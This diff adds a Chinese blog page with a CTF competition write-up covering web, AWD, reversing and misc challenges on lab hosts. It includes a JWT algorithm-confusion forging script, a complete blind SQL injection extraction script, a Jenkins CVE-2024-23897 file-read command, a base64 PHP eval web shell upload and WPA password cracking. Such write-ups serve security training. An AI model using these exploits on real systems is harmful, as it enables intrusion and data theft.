@@ -1,0 +1,501 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>腾龙杯CTF WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="腾龙杯CTF WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Team: Kill_me
+Player: skkyblu3, fallingskies, xiaoxiao...
+WEB
+这是一个登录页面
+/robots.txt提示/fulage
+/login按提示传json返回jwt
+jwt伪造，加密..." />
+    <meta name="keywords" content="WP,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              腾龙杯CTF WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-18
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/rDzRExHLX/" class="post-tag">
+                  # WP
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/teng-long-bei-ctf-wp.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>Team: Kill_me<br>
+Player: skkyblu3, fallingskies, xiaoxiao...</p>
+<h1 id="web">WEB</h1>
+<h2 id="这是一个登录页面">这是一个登录页面</h2>
+<p><code>/robots.txt</code>提示<code>/fulage</code></p>
+<p><code>/login</code>按提示传json返回jwt</p>
+<p>jwt伪造，加密方式设为none，用户设为admin。访问<code>/fulage</code> get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669022312-33167834-afc9-412e-aa2c-facf502e8647.png" alt="image.png" loading="lazy"></p>
+<h2 id="web2">web2</h2>
+<p>响应头返回服务器为gunicorn/20.0.4。</p>
+<p>Gunicorn请求走私：<a href="https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/">https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/</a></p>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669269846-98c1e3c5-9540-462a-8be3-abb2fef189f1.png" alt="image.png" loading="lazy"></figure>
+<p>伪造UA头<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710577625600-12c5313d-c1fc-4ac5-8614-c2b8aa279c0a.png" alt="image.png" loading="lazy"></p>
+<p>提示<code>/fl4g</code>路由<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710577603068-c16441f9-624a-40cc-8333-a550a9e47b12.png" alt="image.png" loading="lazy"></p>
+<p>伪造XFF头<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710577562288-590de4c7-e2dd-434e-bfec-f5bd3847730b.png" alt="image.png" loading="lazy"></p>
+<h2 id="这又是一个登录页面">这又是一个登录页面</h2>
+<p>jwt使用RS256，<code>/robots.txt</code>给出了公钥。参考：<a href="https://wiki.wgpsec.org/knowledge/ctf/JWT.html">https://wiki.wgpsec.org/knowledge/ctf/JWT.html</a></p>
+<p>编写脚本</p>
+<pre><code class="language-python">import jwt
+
+PUBLIC_KEY = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDLPaMvaLEtrAHieDdq1ufCHNj5
+aXw+K2x207zvi8T81QD9tkvUcIkiAzrb0yWbwsfkO+14m80NZHNjj2PyuDdp7rsa
+fEDqKrsSJJnx6DxybAiTqfKVqc2kgmPhJZq7JamarVokX8XQOppQPhRDE+utsXVo
+2SbZm7AglA6T4z6H9wIDAQAB
+-----END PUBLIC KEY-----&quot;&quot;&quot;
+
+
+print(jwt.encode({&quot;account&quot;: &quot;@dministr@t0r&quot;}, key=PUBLIC_KEY, algorithm='HS256'))
+</code></pre>
+<p>注释报错<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669613322-c0dc28c5-7c39-4395-9388-c97c17e84c44.png" alt="image.png" loading="lazy"></p>
+<p>请求get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669634283-706550d4-dee0-4987-93de-1458a4eeb3cc.png" alt="image.png" loading="lazy"></p>
+<h2 id="html练习生">html练习生</h2>
+<p>进去之后随便注册一个账号登录。页面的功能有两个，<code>/change.php</code>可以修改<code>UserID</code>等信息，其中<code>UserID</code>不能为数字<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670223422-ddfd662a-dacc-4b26-a053-c07d9be97f87.png" alt="image.png" loading="lazy"></p>
+<p><code>/log.php</code>查看登录日志<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670262938-b6ddc1d8-aa7f-4c7e-b2dd-9dd1b8682e2d.png" alt="image.png" loading="lazy"></p>
+<p>可以感觉到<code>UserID</code>就是利用点。思考下php通常是怎么判断数字的<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670412143-92fd09c0-4783-44a5-87d9-b028cf8d0da3.png" alt="image.png" loading="lazy"></p>
+<p><code>is_numeric</code>会将十六进制数返回true<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670628531-8ee822c2-e1be-423a-a46d-34fd7b1ea2fa.png" alt="image.png" loading="lazy"></p>
+<p>而MySQL遇到<code>0x</code>开头的数字时，会将其自动转为字符串<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670678607-dc797a81-6887-4fc8-8b0e-b05d52f000fc.png" alt="image.png" loading="lazy"></p>
+<p>在题目中尝试验证，用十六进制字符串修改<code>UserID</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670805602-5d95ed4f-30eb-474c-8e34-0f2f3e31fe3f.png" alt="image.png" loading="lazy"></p>
+<p>重新登录查看登录日志验证成功<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670891554-460db492-9775-4191-9e5e-1b56f59bef08.png" alt="image.png" loading="lazy"></p>
+<p>使用<code>'</code>修改<code>UserID</code>，登录的时候提示<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670951271-8c7623f5-ff2d-43c0-8f4f-e4506aa5afbd.png" alt="image.png" loading="lazy"></p>
+<p>由上可以推测这个大致的工作流程：</p>
+<ul>
+<li>用户信息在一个表中</li>
+<li><code>/change.php</code>可以用十六进制修改用户的<code>UserID</code></li>
+<li>登录的时候<code>UserID</code>会被插入到登录表中</li>
+<li>登录表的内容在<code>/log.php</code>中展示</li>
+</ul>
+<p>那么我们要做的就是在登录，系统用<code>UserID</code>更新登录表的时候，注入我们的SQL语句。因为页面没有详细的报错信息，所以这里用布尔盲注。注入的sql语句使用<code>1' and (布尔查询) and '1</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710671549266-af3db84d-0b36-49a2-a8d9-976c488e05e0.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710671605572-b97744a1-ac1c-4c00-935a-de65579804fb.png" alt="image.png" loading="lazy"></p>
+<p>编写盲注脚本（二分查找）：</p>
+<pre><code class="language-python">import requests
+import time
+from bs4 import BeautifulSoup
+
+def login():
+    burp0_url = &quot;http://cbfoeshg.lab.aqlab.cn:80/login.php?status=success&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;pe3ummnn5lo8h04djclnv6ee36&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Authorization&quot;: &quot;Basic emthcTp6a2Fx&quot;,
+                     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://cbfoeshg.lab.aqlab.cn&quot;,
+                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;,
+                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+                     &quot;Referer&quot;: &quot;http://cbfoeshg.lab.aqlab.cn/login.php?status=success&quot;,
+                     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;,
+                     &quot;Connection&quot;: &quot;close&quot;}
+    burp0_data = {&quot;username&quot;: &quot;Skkyblu3&quot;, &quot;password&quot;: &quot;Skkyblu3&quot;}
+    resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+    return resp.text
+
+def get_log():
+    burp0_url = &quot;http://cbfoeshg.lab.aqlab.cn:80/log.php&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;pe3ummnn5lo8h04djclnv6ee36&quot;}
+    burp0_headers = {&quot;Authorization&quot;: &quot;Basic emthcTp6a2Fx&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;,
+                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+                     &quot;Referer&quot;: &quot;http://cbfoeshg.lab.aqlab.cn/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
+                     &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+
+    if resp.status_code != 200:
+        exit(-1)
+
+    return resp.text
+
+
+def extract_value(html_content):
+    soup = BeautifulSoup(html_content, 'lxml')
+    rows = soup.find_all('th')
+    last_row = rows[-3]
+
+    return last_row.text
+
+
+def string_to_hex(s):
+    hex_representation = '0x' + ''.join(format(ord(c), '02x') for c in s)
+    return hex_representation
+
+
+def modify(payload):
+    payload = string_to_hex(payload)
+
+    burp0_url = &quot;http://cbfoeshg.lab.aqlab.cn:80/change.php&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;pe3ummnn5lo8h04djclnv6ee36&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Authorization&quot;: &quot;Basic emthcTp6a2Fx&quot;,
+                     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://cbfoeshg.lab.aqlab.cn&quot;,
+                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;,
+                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+                     &quot;Referer&quot;: &quot;http://cbfoeshg.lab.aqlab.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
+                     &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    burp0_data = {&quot;age&quot;: '', &quot;school&quot;: '', &quot;student_number&quot;: f&quot;{payload}&quot;}
+    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+
+def exploit(payload):
+    modify(payload)
+    login()
+    content = get_log()
+    res = extract_value(content)
+    return res
+
+
+result = &quot;&quot;
+for i in range(1, 1000):  # adjust as needed
+    param_data = {}
+    low = 32
+    high = 128
+    mid = (low + high) // 2
+    while low &lt; high:
+        # payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(schema_name))FROM(information_schema.schemata)),{i},1))&gt;{mid}) and '1&quot;
+        # payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(table_name))FROM(information_schema.tables)where(table_schema='test')),{i},1))&gt;{mid}) and '1&quot;
+        # payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='injectflag')),{i},1))&gt;{mid}) and '1&quot;
+        payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(fl4g))FROM(ctf.injectflag)),{i},1))&gt;{mid}) and '1&quot;
+        res = exploit(payload)
+
+        time.sleep(0.04)
+        if &quot;1&quot; == res:  # 在这个区域中
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) // 2
+
+    result += chr(mid)
+    print(&quot;Extracted so far: &quot; + result)
+    if mid == 32 or mid == 127:
+        break
+</code></pre>
+<p>get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710671836783-49fdbd82-d5a0-4641-982f-cd8d8c70e08c.png" alt="image.png" loading="lazy"></p>
+<h1 id="awd">AWD</h1>
+<h2 id="签到jenkins是啥">签到：jenkins是啥？</h2>
+<p>Jenkins 未授权文件读取漏洞（CVE-2024-23897）<br>
+访问<a href="http://h9cvu77jr0.lab.aqlab.cn/">http://h9cvu77jr0.lab.aqlab.cn/jnlpJars/jenkins-cli.jar</a> 下载jar<br>
+java -jar jenkins-cli.jar -auth zkaq:zkaq -s &quot;<a href="http://h9cvu77jr0.lab.aqlab.cn%22">http://h9cvu77jr0.lab.aqlab.cn&quot;</a> -http who-am-i &quot;@/tmp/flag&quot;<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685353661-6ec9edef-61c0-4c6a-9c14-8e7f58826605.png" alt="image.png" loading="lazy"></p>
+<h2 id="什么英文站">什么？英文站？</h2>
+<p>用html在github上搜搜，找到项目<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710580810233-cd334933-b3d9-49db-a554-a1c55273034e.png" alt="image.png" loading="lazy"></p>
+<p><code>/search.php</code>存在sql注入<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710672123797-db978957-172c-43d3-a592-72b6a70bcc6c.png" alt="image.png" loading="lazy"></p>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710580824640-a8093566-3c39-4108-a064-f528e831e3ff.png" alt="image.png" loading="lazy"></p>
+<h2 id="来耍pyq">来耍pyq</h2>
+<p>发朋友圈可以上传图片，抓包发现图片使用base64上传的。推测后端的处理逻辑如下：</p>
+<pre><code class="language-php">$img = $_POST['imgbase64'];
+if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
+    $type = &quot;.&quot;.$result[2];
+    $path = &quot;upload/&quot; . date(&quot;Y-m-d&quot;) . &quot;-&quot; . uniqid() . $type;
+}
+$img =  base64_decode(str_replace($result[1], '', $img));
+@file_put_contents($path, $img);
+exit('{&quot;src&quot;:&quot;'.$path.'&quot;}');
+</code></pre>
+<p>用base64编码恶意代码上传</p>
+<pre><code>data:image/php;base64,PD9waHAgZXZhbCgkX0dFVFsic2treSJdKTs/Pg==
+</code></pre>
+<p>执行<code>phpinfo();</code>发现ban所有的命令执行函数。使用文件操作获取目录结构<code>?skky=echo implode(&quot;\n&quot;, array_diff(scandir('../'), array('.', '..')));</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710651418783-ea06b3fa-56b1-4a62-b811-2678fc507b0b.png" alt="image.png" loading="lazy"></p>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710672951977-c1979518-3386-4732-8433-cecc507cc934.png" alt="image.png" loading="lazy"></p>
+<h2 id="安全系统">安全系统</h2>
+<p>根据路由<code>patient/doctors.php</code>在github找到原项目：<a href="https://github.com/HashenUdara/edoc-doctor-appointment-system/tree/main">https://github.com/HashenUdara/edoc-doctor-appointment-system/tree/main</a><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710683686735-c7249a7c-bcfd-4d22-a22a-911881818e8b.png" alt="image.png" loading="lazy"></p>
+<p>题目提示flag在一个patient的用户中。代码审计，在<code>patient/setting.php</code>存在用户遍历<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710683831323-ea341f25-0210-47a7-a6cc-0e86e5f09026.png" alt="image.png" loading="lazy"></p>
+<p>bp遍历用户，在id=234的时候出了结果，邮箱为patient@mypatient.com<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710683500970-ccf297d9-80ea-46a7-b927-2fb5bbd1668b.png" alt="image.png" loading="lazy"></p>
+<p>使用<code>patient/setting.php?action=edit&amp;id=234</code>直接修改用户密码。<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686571088-20cce7bc-072b-4072-b4b7-d59200b6505f.png" alt="image.png" loading="lazy"></p>
+<p>登录用户get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686162625-dfa8752f-c0dd-45a2-b46d-fb01937ad5ae.png" alt="image.png" loading="lazy"></p>
+<h1 id="rev">REV</h1>
+<h2 id="签到输入神秘代码召唤神龙">签到：输入神秘代码，召唤神龙！</h2>
+<p>.net程序，直接使用dotpeek打开<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685556810-fd61ee25-d42d-4119-abaf-59abb76345f1.png" alt="image.png" loading="lazy"><br>
+base64解密后比较字符<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685606348-78f427f1-5cd9-43e2-b7fa-0d814bf8960b.png" alt="image.png" loading="lazy"></p>
+<h2 id="猜拳游戏">猜拳游戏</h2>
+<p>文件为apk，使用jadx打开<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685795379-5af3d41c-1ebd-404b-8866-145702b7c949.png" alt="image.png" loading="lazy"><br>
+calc函数位于native层<br>
+将apk改为zip后解压<br>
+使用ida打开libcalc.so<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685946769-bc8d6db8-7930-44a2-8ae1-f7a792d36e4f.png" alt="image.png" loading="lazy"><br>
+flag为<br>
+（1000+7）*107<br>
+apkflag{107749}</p>
+<h1 id="misc">MISC</h1>
+<h2 id="签到简简单单一张图片">签到：简简单单一张图片</h2>
+<p>查看图片，很多颜色块，应该是rgb隐写。<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686160080-c793198e-9929-4422-a7cd-4ccdcaa41811.png" alt="image.png" loading="lazy"><br>
+使用stegsolver打开图片<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686326979-9642e588-ee16-491e-a73f-4f7dc56912fb.png" alt="image.png" loading="lazy"><br>
+猜测使用了rot13<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686422011-904c3c5e-f0fe-4c72-a302-a7dffbfac71a.png" alt="image.png" loading="lazy"></p>
+<h2 id="嘘~听是什么声音">嘘~听，是什么声音？</h2>
+<p>根据文件名字知道是DTMF隐写<br>
+使用在线网址分析<a href="http://dialabc.com/sound/detect/">http://dialabc.com/sound/detect/</a><br>
+解出后观察格式<br>
+81 63 31 21 93 42 21 71 71 93 74 81 82 31 93 31 81 61 33<br>
+第二位都是小于等于4，显然是9键密码<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686673176-be5ebfb3-00ca-459e-be21-ba9d2970d6fc.png" alt="image.png" loading="lazy"><br>
+解得：TODAYHAPPYSTUDYDTMF</p>
+<h2 id="niu-niang分析">niu niang分析</h2>
+<p>使用wireshark打开发现是802.11格式<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686774850-dc402e52-dc2a-45a6-8424-c17591eea7dd.png" alt="image.png" loading="lazy"><br>
+使用aircrack-ng先跑一下密码<br>
+<code>.\aircrack-ng.exe D:\Downloads\shujubao\shujubao.cap -w ..\..\..\..\rockyou.txt\rockyou.txt</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686979281-fed0f04c-8867-4a68-831f-b84a80779cc2.png" alt="image.png" loading="lazy"><br>
+得到密码是12345678<br>
+使用airdecap-ng解密数据包<br>
+<code>.\airdecap-ng.exe -e mamawoxiangwantiequan -p 12345678 D:\Downloads\shujubao\shujubao.cap</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687076789-927d394a-2760-41d3-8d3c-2d32dc0e3aaf.png" alt="image.png" loading="lazy"><br>
+打开wireshark分析<br>
+跟踪tcp流，找到第31个上传png，host是ip，很可疑<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687187077-ee55feb1-9208-43eb-809a-c83b59468291.png" alt="image.png" loading="lazy"><br>
+将文件导到本地进行分析，用010editor打开，发现尾部有一个zip文件，分离出来，发现有密码。<br>
+根据session中得jwt提示<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687299585-ebbae1f4-ae2d-4d93-8bb1-7033dda54912.png" alt="image.png" loading="lazy"><br>
+ping过得网站，查看没有icmp数据包，查看dns数据包<br>
+其中一个解析地址为127.0.0.1<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687411378-c86e8eaa-9cd1-4a34-b005-0c8963d9e3c0.png" alt="image.png" loading="lazy"><br>
+使用密码解密zip，打开flag.txt<br>
+flag{f14376d0-793e-4e20-9eab-af23f3fdc158}</p>
+<h2 id="easy_forensics">easy_Forensics</h2>
+<p>使用Magnet AXIOM直接打开img<br>
+<a href="https://blog.51cto.com/u_15878568/5873703">Magnet AXIOM）</a><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710688260155-9a23bdc9-da2b-46bd-ae07-3b8e61d9823e.png" alt="image.png" loading="lazy"><br>
+发现最近访问文件phos.png，导出文件<br>
+发现文件尾步中有一个zip 压缩包，提取 zip。<br>
+解压之得到message.img<br>
+挂载镜像，发现hint.txt<br>
+hint.txt的格式显然是坐标地址<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710688690358-d2609bd1-74b0-45f6-95fb-74d8214afb9f.png" alt="image.png" loading="lazy"><br>
+使用脚本画出二维码</p>
+<pre><code>import matplotlib.pyplot as plt
+with open('./hint.txt', 'r') as f:
+    save = f.readlines()
+x = []
+y = []
+for t in save:
+    x.append(t.split()[0])
+    y.append(t.split()[1])
+plt.axis('equal')
+plt.scatter(x, y, s = 1, c = 'black', marker = 's')
+plt.show()
+</code></pre>
+<p>使用画板的反色功能<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710688577598-959c2a6f-30a8-43dd-8b7a-de99081d186e.png" alt="image.png" loading="lazy"><br>
+扫描二维码，得到<br>
+Here is the vigenere key: aeolus, but i deleted the encrypted message。<br>
+使用010editor打开message.img，发现字符串：yispn!buwh_qcfd_ebo_mglzs<br>
+使用密码解密得：yeeeeet!just_find_and_solve<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710689133759-8ef7a3c7-9ead-4b43-be2e-96a0f1fc9fed.png" alt="image.png" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web">WEB</a>
+<ul>
+<li><a href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2">这是一个登录页面</a></li>
+<li><a href="#web2">web2</a></li>
+<li><a href="#%E8%BF%99%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2">这又是一个登录页面</a></li>
+<li><a href="#html%E7%BB%83%E4%B9%A0%E7%94%9F">html练习生</a></li>
+</ul>
+</li>
+<li><a href="#awd">AWD</a>
+<ul>
+<li><a href="#%E7%AD%BE%E5%88%B0jenkins%E6%98%AF%E5%95%A5">签到：jenkins是啥？</a></li>
+<li><a href="#%E4%BB%80%E4%B9%88%E8%8B%B1%E6%96%87%E7%AB%99">什么？英文站？</a></li>
+<li><a href="#%E6%9D%A5%E8%80%8Dpyq">来耍pyq</a></li>
+<li><a href="#%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F">安全系统</a></li>
+</ul>
+</li>
+<li><a href="#rev">REV</a>
+<ul>
+<li><a href="#%E7%AD%BE%E5%88%B0%E8%BE%93%E5%85%A5%E7%A5%9E%E7%A7%98%E4%BB%A3%E7%A0%81%E5%8F%AC%E5%94%A4%E7%A5%9E%E9%BE%99">签到：输入神秘代码，召唤神龙！</a></li>
+<li><a href="#%E7%8C%9C%E6%8B%B3%E6%B8%B8%E6%88%8F">猜拳游戏</a></li>
+</ul>
+</li>
+<li><a href="#misc">MISC</a>
+<ul>
+<li><a href="#%E7%AD%BE%E5%88%B0%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87">签到：简简单单一张图片</a></li>
+<li><a href="#%E5%98%98~%E5%90%AC%E6%98%AF%E4%BB%80%E4%B9%88%E5%A3%B0%E9%9F%B3">嘘~听，是什么声音？</a></li>
+<li><a href="#niu-niang%E5%88%86%E6%9E%90">niu niang分析</a></li>
+<li><a href="#easy_forensics">easy_Forensics</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/pearlctf2024web-wp/">
+              <h3 class="post-title">
+                [PearlCTF2024]WEB WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
